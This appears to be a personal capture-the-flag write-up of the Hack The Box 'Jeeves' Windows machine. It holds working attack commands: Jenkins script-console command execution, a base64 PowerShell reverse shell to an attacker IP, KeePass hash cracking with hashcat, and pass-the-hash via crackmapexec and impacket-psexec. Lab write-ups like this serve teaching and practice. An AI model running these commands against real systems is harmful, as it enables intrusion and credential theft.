#windows 

# Story
- Perform port scan
- Check directories
- Find job submission page
- Submit a job with an arbitrary command
- Submit reverse shell (user flag)
- kee file
- hashcat to crack the password
- Check password and hash
- We can get system permission using the backup hash
- get flag (root flag)

# Enumeration
## Nmap
```
nmap -sC -sV jeeves.htb
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-28 06:53 EST
Nmap scan report for jeeves.htb (10.129.228.112)
Host is up (0.21s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-02-28T16:53:57
|_  start_date: 2023-02-28T16:48:22
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: mean: 4h59m58s, deviation: 0s, median: 4h59m57s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.25 seconds
```

Its a windows machine.

## Directory check
### Gobuster
#### at 80
```
gobuster dir -k -u http://jeeves.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200
```
Nothing showed up

#### at 50000
```
 gobuster dir -k -u http://jeeves.htb:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200

/askjeeves            (Status: 302) [Size: 0] [--> http://jeeves.htb:50000/askjeeves/]
Progress: 220560 / 220561 (100.00%)
```
askjeeves seems interesting

## SMB port 445
```
smbmap -H jeeves.htb        
[!] Authentication error on jeeves.htb
```
Could not find anything


## HTTP
### at 80
![[Pasted image 20230228215026.png]]

![[Pasted image 20230228215041.png]]
Nothing special

### at 50000
#### jeeves.htb:50000
`Powered by Jetty:// 9.4.z-SNAPSHOT`

![[Pasted image 20230228215215.png]]
#### jeeves.htb:50000/askjeeves/

Seems like we can submit jobs
![[Pasted image 20230228210224.png]]

Jenkins version 2.87

### Running scripts

![[Pasted image 20230301004209.png]]

`println "cmd /c whoami".execute().text`

## Build

Under new item, we can create a new job. Set whatever name and select Freestyle project.
![[Pasted image 20230301134812.png]]

After that, we try windows batch command.
![[Pasted image 20230301134854.png]]
We want to see whatever result, so lets try whoami.
![[Pasted image 20230301134919.png]]

Build it and then see console output.
![[Pasted image 20230301134935.png]]

![[Pasted image 20230301135001.png]]
Whoami worked.


# Foothold
## Reverse Shell
### Set up revshell job
Set up shell in job just like how we ran whoami.
https://www.revshells.com/ PowerShell#3 (Base64)
```
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwA5ACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```


### nc listen
```
nc -lnvp 1234              
listening on [any] 1234 ...
connect to [10.10.14.39] from (UNKNOWN) [10.129.228.112] 49676
whoami
jeeves\kohsuke
PS C:\Users\Administrator\.jenkins\workspace\revshell> 
```


# Privilege Escalation
## Enumeration
### Check net user
```
PS C:\Users\kohsuke\Desktop> net user

User accounts for \\JEEVES

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
kohsuke                  
The command completed successfully.

```

### kohsuke/Document

```
PS C:\Users\kohsuke\Documents> ls


    Directory: C:\Users\kohsuke\Documents


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        9/18/2017   1:43 PM           2846 CEH.kdbx                                                              
```

kdbx file?? Its a password database it seems like. KeePass?

### Shared file
```
Directory: C:\Users\Administrator\.jenkins\workspace


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----         3/1/2023   4:56 AM                revshell                                                              
d-----         3/1/2023   4:47 AM                test                                                                  
```
We want to analyze this file in linux machine, so lets transfer it. 
![[Pasted image 20230301140718.png]]
Need to create a file. `PS C:\Users\Administrator\.jenkins\workspace\revshell\tofu>
`
### Analyze the file in linux machine
```
PS C:\Users\Administrator\.jenkins\workspace\revshell\tofu> copy C:\Users\kohsuke\Documents\CEH.kdbx .
```

![[Pasted image 20230301140912.png]]
### Hashcat
We use hashcat for the .kdbx file.
```
┌──(kali㉿kali)-[~/Downloads]
└─$ keepass2john CEH.kdbx 
CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ keepass2john CEH.kdbx > CEH.kdbx.hash
```

```
hashcat ~/Desktop/CEH.kdbx.hash /usr/share/wordlists/rockyou.txt --user -m 13400     
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-11th Gen Intel(R) Core(TM) i7-11700 @ 2.50GHz, 2918/5900 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48:moonshine1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13400 (KeePass 1 (AES/Twofish) and KeePass 2 (AES))
Hash.Target......: $keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea...47db48
Time.Started.....: Wed Mar  1 01:35:53 2023 (21 secs)
Time.Estimated...: Wed Mar  1 01:36:14 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     2598 H/s (8.17ms) @ Accel:512 Loops:128 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 55296/14344385 (0.39%)
Rejected.........: 0/55296 (0.00%)
Restore.Point....: 54272/14344385 (0.38%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:5888-6000
Candidate.Engine.: Device Generator
Candidates.#1....: 250895 -> grad2010
Hardware.Mon.#1..: Util:100%

Started: Wed Mar  1 01:35:47 2023
Stopped: Wed Mar  1 01:36:16 2023
```

### Handle keepass
```
 kpcli --kdb CEH.kdbx
Provide the master password: *************************

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> find .
Searching for "." ...
 - 8 matches found and placed into /_found/
Would you like to list them now? [y/N] 
=== Entries ===
0. Backup stuff                                                           
1. Bank of America                                   www.bankofamerica.com
2. DC Recovery PW                                                         
3. EC-Council                               www.eccouncil.org/programs/cer
4. It's a secret                                 localhost:8180/secret.jsp
5. Jenkins admin                                            localhost:8080
6. Keys to the kingdom                                                    
7. Walmart.com                                             www.walmart.com

```
moonshine1 is the password


```
kpcli:/> find .
Searching for "." ...
 - 8 matches found and placed into /_found/
Would you like to list them now? [y/N] 
=== Entries ===
0. Backup stuff                                                           
1. Bank of America                                   www.bankofamerica.com
2. DC Recovery PW                                                         
3. EC-Council                               www.eccouncil.org/programs/cer
4. It's a secret                                 localhost:8180/secret.jsp
5. Jenkins admin                                            localhost:8080
6. Keys to the kingdom                                                    
7. Walmart.com                                             www.walmart.com
kpcli:/> 
kpcli:/> show -f 0

 Path: /CEH/
Title: Backup stuff
Uname: ?
 Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
  URL: 
Notes: 

kpcli:/> show -f 1

 Path: /CEH/
Title: Bank of America
Uname: Michael321
 Pass: 12345
  URL: https://www.bankofamerica.com
Notes: 

kpcli:/> show -f 2

 Path: /CEH/
Title: DC Recovery PW
Uname: administrator
 Pass: S1TjAtJHKsugh9oC4VZl
  URL: 
Notes: 

kpcli:/> show -f 3

 Path: /CEH/
Title: EC-Council
Uname: hackerman123
 Pass: pwndyouall!
  URL: https://www.eccouncil.org/programs/certified-ethical-hacker-ceh
Notes: Personal login

kpcli:/> show -f 4

 Path: /CEH/
Title: It's a secret
Uname: admin
 Pass: F7WhTrSFDKB6sxHU1cUn
  URL: http://localhost:8180/secret.jsp
Notes: 

kpcli:/> show -f 5

 Path: /CEH/
Title: Jenkins admin
Uname: admin
 Pass: 
  URL: http://localhost:8080
Notes: We don't even need creds! Unhackable! 

kpcli:/> show -f 6

 Path: /CEH/
Title: Keys to the kingdom
Uname: bob
 Pass: lCEUnYPjNfIuPZSzOySA
  URL: 
Notes: 

kpcli:/> show -f 7

 Path: /CEH/
Title: Walmart.com
Uname: anonymous
 Pass: Password
  URL: http://www.walmart.com
Notes: Getting my shopping on
```

#### collect passwords
passwords
```
aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
12345
S1TjAtJHKsugh9oC4VZl
pwndyouall!
F7WhTrSFDKB6sxHU1cUn
lCEUnYPjNfIuPZSzOySA
Password
```
## Foothold
### Crackmapexec
```
crackmapexec smb jeeves.htb -u Administrator -p passwords
/usr/lib/python3/dist-packages/pywerview/requester.py:144: SyntaxWarning: "is not" with a literal. Did you mean "!="?
  if result['type'] is not 'searchResEntry':
SMB         jeeves.htb      445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         jeeves.htb      445    JEEVES           [-] Jeeves\Administrator:aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 STATUS_LOGON_FAILURE 
SMB         jeeves.htb      445    JEEVES           [-] Jeeves\Administrator:12345 STATUS_LOGON_FAILURE 
SMB         jeeves.htb      445    JEEVES           [-] Jeeves\Administrator:S1TjAtJHKsugh9oC4VZl STATUS_LOGON_FAILURE 
SMB         jeeves.htb      445    JEEVES           [-] Jeeves\Administrator:pwndyouall! STATUS_LOGON_FAILURE 
SMB         jeeves.htb      445    JEEVES           [-] Jeeves\Administrator:F7WhTrSFDKB6sxHU1cUn STATUS_LOGON_FAILURE 
SMB         jeeves.htb      445    JEEVES           [-] Jeeves\Administrator:lCEUnYPjNfIuPZSzOySA STATUS_LOGON_FAILURE 
SMB         jeeves.htb      445    JEEVES           [-] Jeeves\Administrator:Password STATUS_LOGON_FAILURE 
```

```
 Path: /CEH/
Title: Backup stuff
Uname: ?
 Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
  URL: 
Notes: 
```

potentially LM Hash: NT Hash?

#### Crackstation
https://crackstation.net/
![[Pasted image 20230301155710.png]]


### Crackmapexec again
```
crackmapexec smb jeeves.htb -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
/usr/lib/python3/dist-packages/pywerview/requester.py:144: SyntaxWarning: "is not" with a literal. Did you mean "!="?
  if result['type'] is not 'searchResEntry':
SMB         jeeves.htb      445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         jeeves.htb      445    JEEVES           [+] Jeeves\Administrator:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)
                                                                                                                        
```

### Psexec
```
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@jeeves.htb cmd.exe
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on jeeves.htb.....
[*] Found writable share ADMIN$
[*] Uploading file pgAKkTVF.exe
[*] Opening SVCManager on jeeves.htb.....
[*] Creating service hmME on jeeves.htb.....
[*] Starting service hmME.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```

### Desktop
```
Directory of C:\Users\Administrator\Desktop

e 03/01/2023  07:14 AM    <DIR>          .
03/01/2023  07:14 AM    <DIR>          ..
12/24/2017  02:51 AM                36 hm.txt
03/01/2023  07:14 AM                 0 ls
11/08/2017  09:05 AM               797 Windows 10 Update Assistant.lnk
               3 File(s)            833 bytes
               2 Dir(s)   2,638,098,432 bytes free

C:\Users\Administrator\Desktop> dir
The system cannot find the file specified.
 
C:\Users\Administrator\Desktop> type hm.txt
The flag is elsewhere.  Look deeper.
```

We do look deeper with `dir /R`

```
 Directory of C:\Users\Administrator\Desktop

03/01/2023  07:14 AM    <DIR>          .
03/01/2023  07:14 AM    <DIR>          ..
12/24/2017  02:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
03/01/2023  07:14 AM                 0 ls
11/08/2017  09:05 AM               797 Windows 10 Update Assistant.lnk
               3 File(s)            833 bytes
               2 Dir(s)   2,638,098,432 bytes free
```

## Flag
`C:\Users\Administrator\Desktop> more < hm.txt:root.txt`
